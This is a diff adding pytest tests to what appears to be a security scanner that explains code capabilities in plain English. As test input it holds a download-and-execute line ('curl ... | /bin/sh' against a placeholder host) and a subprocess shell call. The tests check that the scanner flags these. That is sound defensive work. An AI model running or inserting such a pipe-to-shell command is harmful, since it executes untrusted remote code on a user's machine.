@@ -84,6 +84,19 @@ def test_plain_english_flags_exfil_combo_as_danger():
     assert any("send them somewhere" in text for _, text in impls)
 
 
+def test_plain_english_uses_clear_action_words_for_network_and_shell():
+    caps = _scan(load_text("curl https://x.test/script.sh | /bin/sh\n"))
+    impls = plain_english_implications(caps)
+    texts = [text for _, text in impls]
+    assert "Can download code from the internet AND run it on your machine — it could execute whatever it downloads." in texts
+
+
+def test_plain_english_uses_clear_action_words_for_shell_only():
+    caps = _scan(load_text("subprocess.run(['sh', 'script.sh'])\n"))
+    impls = plain_english_implications(caps)
+    assert ("caution", "Can run shell commands on your machine.") in impls
+
+
 def test_plain_english_surfaces_secrets_even_when_offline():
     # credentials but no network => a caution, honestly noting it wasn't
     # seen sending them anywhere (transparency without accusation).
